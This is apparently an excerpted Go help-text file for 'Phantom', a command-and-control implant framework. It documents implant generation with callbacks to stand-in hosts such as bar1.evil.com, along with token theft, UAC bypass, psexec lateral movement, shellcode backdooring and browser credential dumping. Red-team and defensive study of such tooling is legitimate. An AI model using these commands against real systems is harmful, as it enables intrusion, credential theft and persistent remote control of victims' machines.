...
import (
	...
	"github.com/cryptdefender3232/phantom/client/theme"
)
...
arguments are be separated from the phantom 'execute' arguments with '--' 
...
[[.Bold]]About:[[.Normal]] List Phantom sessions, and optionally interact or kill a session. Process integrity information is only available on Windows and is updated each time the getprivs command is executed.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Phantom.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <phantom name/session>
[[.Bold]]About:[[.Normal]] Get information about a Phantom by name, or for the active Phantom.`

	aiHelp = `[[.Bold]]Command:[[.Normal]] ai
[[.Bold]]About:[[.Normal]] Launch the Phantom AI Bubble Tea TUI. The AI workspace now loads server-side conversation threads over gRPC, keeps them synced through the shared event stream, and renders conversation transcripts as markdown in the main pane.
...
[[.Bold]]About:[[.Normal]] Browse the embedded Phantom documentation in a Bubble Tea TUI. The left pane is a searchable docs browser, and the right pane renders markdown with Glow styling.
...
`
	...
	useHelp = `[[.Bold]]Command:[[.Normal]] use [phantom name/session]
[[.Bold]]About:[[.Normal]] Switch the active Phantom, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new phantom binary and saves the output to the cwd or a path specified with --save.
...
The follow command is used to generate a phantom Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

The follow command is used to generate a phantom Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
...
You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.cryptdefender3232.github.io
...
Execution limits can be used to restrict the execution of a Phantom implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Phantom config
...
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Phantom profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-phantom-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a phantom corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-phantom-profile
...
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Phantom commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
...
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new Phantom session as an elevated process (UAC bypass)`
...
Shellcode files should be binary encoded, you can generate Phantom shellcode files with the generate command:
...
Websites can be thought of as a collection of content identified by a name, Phantom can store any number of
...
[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the Phantom implant will wait until the hosting process
...
[[.Bold]]About:[[.Normal]] Load a Phantom macro to add new commands.
...
Phantom macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  ...
  "macroCommands":[
    {
      "name":"chrome-dump", // name of the command available in the phantom client (no space)
...
[[.Bold]]About:[[.Normal]] Start a new phantom as a service on a remote target.

This command uploads a Phantom binary generated on the fly from a profile.
...
The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Phantom session.
`
	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
[[.Bold]]About:[[.Normal]] Inject a phantom shellcode into an existing file on the target system.
...
Phantom will attempt to detect the type of file automatically or you can specify a file type with 
...
using PhantomPy (Python) or phantom-script (TypeScript/JavaScript).
...
we recommend using PhantomPy (Python) or phantom-script (TypeScript/JavaScript).
...
The DLL used for the hijack can either be a file on the operator's system or built from a Phantom profile,
...
# Use a Phantom generated DLL for the hijack (you must specify -R or --run-at-load)
...
If no extension is specified, Phantom will enumerate all installed extensions, extract their
...
External builders allow the Phantom server offload implant builds onto external machines.
For more information: https://github.com/cryptdefender3232/phantom/wiki/External-Builders
`
...
Phantom uses the same hash identifiers as Hashcat (use the #):
...
[[.Bold]]About:[[.Normal]] Display details of HTTP C2 profiles loaded into Phantom.
`
